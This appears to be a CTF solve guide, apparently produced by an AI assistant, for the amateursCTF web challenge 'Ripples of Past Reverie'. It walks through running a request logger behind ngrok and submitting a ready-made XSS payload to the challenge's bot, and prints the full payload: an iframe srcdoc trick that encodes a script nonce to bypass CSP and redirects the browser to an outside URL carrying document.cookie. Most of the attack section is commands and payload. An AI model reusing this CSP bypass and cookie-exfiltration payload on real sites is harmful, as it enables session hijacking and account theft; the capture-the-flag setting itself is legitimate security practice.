# 🎯 FLAG CAPTURE - Ripple of Past Reverie

## ⚡ FASTEST PATH TO FLAG

### Current Status
- ✅ All tools are ready
- ✅ ngrok is running (needs port change)
- ⏳ Ready to capture flag

### Execute These 3 Commands

**Terminal 1** (Start logger - keep running):
```bash
python tools\query_logger.py --port 8000
```

**Terminal 2** (Restart ngrok):
1. Press `Ctrl+C` to stop your current ngrok
2. Run:
```bash
ngrok http 8000
```
3. **COPY the HTTPS URL** it displays (e.g., `https://something.ngrok-free.dev`)

**Terminal 3** (Submit & get flag):
```bash
# Replace with YOUR ngrok URL from Terminal 2
GET_FLAG.bat "https://YOUR-NGROK-URL-HERE"
```

### Example
If your ngrok shows: `https://abc123.ngrok-free.dev`

Then run:
```bash
GET_FLAG.bat "https://abc123.ngrok-free.dev"
```

---

## 📋 What Happens Next

1. Script submits XSS payload to bot at `https://web-ripple-of-past-revirie-tfk6tz07.amt.rs/`
2. Bot's headless browser visits the page with your payload
3. Your JavaScript executes (bypassing CSP with nonce trick)
4. Browser redirects to your ngrok URL with the cookie
5. **Terminal 1** (query_logger) shows the flag:
   ```
   [timestamp] GET /?c=flag%3DamateursCTF%7B...
     - c = flag=amateursCTF{your_flag_here}
   ```

---

## 🔧 Verify Setup First (Optional)

Check if everything is ready:
```bash
python tools\check_setup.py "https://YOUR-NGROK-URL"
```

This will tell you if:
- ✓ Query logger is running on port 8000
- ✓ ngrok URL is accessible
- ✓ Can reach CTF bot URL

---

## 🎓 How the Exploit Works

**The Vulnerability**: CSP with nonce-based script execution

**The Bypass**: iframe srcdoc with HTML entity encoding
- Outer HTML parser sees: `&quot;%&#78;4%&#43;...`
- Inner iframe decodes to actual nonce: `"N4+h2wfdFxXix7rCgwhVvA=="`
- Script executes and exfils cookie to your ngrok URL

**Full Payload**:
```html
<iframe srcdoc="<script nonce=&quot;%&#78;4%&#43;h2wfdFxXix7rCgwhVvA%&#61;%&#61;&quot;>
  window.location='https://YOUR_NGROK/?c='+encodeURIComponent(document.cookie)
</script>"></iframe>
```

---

## 📝 Files Created

- `tools/submit_bot.py` - Submits payload to CTF bot
- `tools/check_setup.py` - Verifies all services are ready
- `GET_FLAG.bat` - One-command flag capture
- `QUICK_START.md` - Detailed setup guide
- `SOLUTION_GUIDE.md` - Complete walkthrough with troubleshooting

---

## 🚨 Troubleshooting

**No requests in query_logger?**
- Ensure ngrok is on port 8000 (not 80!)
- Verify "Session Status: online" in ngrok
- Wait 30 seconds after submitting

**Rate limit error?**
- Bot allows 10 requests/minute
- Wait 60 seconds and retry

**Connection errors?**
- Confirm query_logger.py is running
- Check ngrok URL is HTTPS
- Verify internet connection

---

## 🎮 Challenge Info

- **Challenge**: Ripples of Past Reverie
- **Points**: 484
- **Solves**: 2
- **Category**: Web / XSS / CSP Bypass
- **App URL**: https://web-ripple-of-past-revirie-a8hd38x0.amt.rs
- **Bot URL**: https://web-ripple-of-past-revirie-tfk6tz07.amt.rs

---

## ⏱️ Time Remaining

Challenge expires in: **09:55** (from your original message)

**GO GET THAT FLAG!** 🚀
